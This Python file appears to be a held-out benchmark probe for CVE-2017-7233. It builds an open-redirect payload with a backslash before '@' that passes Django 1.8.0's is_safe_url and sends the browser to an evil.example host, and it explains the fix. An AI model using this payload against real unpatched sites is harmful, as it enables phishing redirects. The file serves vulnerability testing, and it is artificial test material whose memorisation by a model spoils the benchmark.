#!/usr/bin/env python3
r"""[HELD-OUT] CVE-2017-7233 residual -- backslash basic-auth bypass of the CVE-2015-2317 fix.

Real-app-http: fired as a real HTTP request `GET /login?next=<v>` (Host: app.local) against the
running Django app; the app's `go` view gates the redirect through Django's OWN is_safe_url and
returns a real 302.

The CVE-2015-2317 fix (present on V1 = Django 1.8.0) added the leading-control-char check, but
`is_safe_url()` still validates the URL only ONCE, after normalising `\` to `/`:

    url = url.replace('\\', '/')
    url_info = urlparse(url)
    ...
    return (not url_info.netloc or url_info.netloc == host) and ...

A payload `http://<host>\@<FLAG>.evil.example` (a backslash right before the `@`) normalises to
`http://<host>/@<FLAG>.evil.example`, whose netloc is exactly `<host>` (== the app's own host, sent
as Host: app.local), so is_safe_url returns True and the login view redirects to the RAW value.
Browsers treat everything up to the `@` as basic-auth *userinfo*, so the real host they connect to is
`<FLAG>.evil.example` -> off-origin open redirect. The redirect-host label is the per-run
${PCB_FLAG}, so the flag surfaces in the real 302 Location header on V1.

This is CVE-2017-7233: is_safe_url() mishandled certain URLs with backslash + basic-auth credentials
(`http://otherserver\@example.com`), an incomplete-fix residual of the earlier hardening.

CVE-2017-7233 fix (V2 = Django 1.8.18) validates BOTH the raw URL and the backslash-normalised URL:

    return _is_safe_url(url, host) and _is_safe_url(url.replace('\\', '/'), host)

For the RAW url, Django's own `_urlsplit` does NOT treat `\` as a netloc delimiter, so
netloc == `<host>\@<FLAG>.evil.example` != host -> `_is_safe_url` returns False -> the residual is
rejected (falls back to `Location: /`, no flag).

Contract: reaches the flag on V1; closed on V2. (Host label defaults to APP_HOST='app.local'.)
"""
from __future__ import annotations

import os

HOST = os.environ.get("APP_HOST", "app.local")


def candidate(flag: str) -> dict:
    """A GET /login whose ?next= puts a backslash before the `@` so the app-host reads as userinfo."""
    return {
        "probe_id": "cve-2017-7233-backslash-basicauth",
        "method": "GET",
        "path": "/login",
        "next": f"http://{HOST}\\@{flag}.evil.example",
    }


if __name__ == "__main__":
    print(candidate("PCBFLAG_demo")["next"])
